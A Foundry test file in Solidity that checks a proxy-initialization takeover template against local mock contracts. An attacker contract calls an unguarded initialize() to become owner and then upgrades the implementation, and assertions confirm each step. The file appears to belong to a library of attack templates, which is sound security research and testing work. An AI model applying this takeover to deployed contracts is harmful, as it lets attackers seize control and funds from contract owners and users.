// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/mocks/MockProxy.sol";
import "../src/mocks/MockImpl.sol";
import "../src/attacks/proxy_initialization.sol";

/**
 * @title ProxyInitializationTest
 * @notice Proves the `proxy_initialization` template: an unguarded
 *         initialize() on a fresh proxy lets the first caller become owner
 *         and upgrade the implementation.
 */
contract ProxyInitializationTest is Test {
    MockProxy public proxy;
    MockImpl public impl;
    ProxyTakeover public attacker;

    function setUp() public {
        impl = new MockImpl();
        proxy = new MockProxy(); // owner left unset (address(0))
        attacker = new ProxyTakeover(address(proxy));
    }

    function testProxyTakeover() public {
        // nobody called initialize() first — attacker claims ownership
        attacker.claimOwnership();
        assertEq(proxy.owner(), address(attacker), "attacker became owner");

        // and upgrades the implementation
        attacker.upgrade(address(impl));
        assertEq(proxy.implementation(), address(impl), "implementation replaced");
    }
}
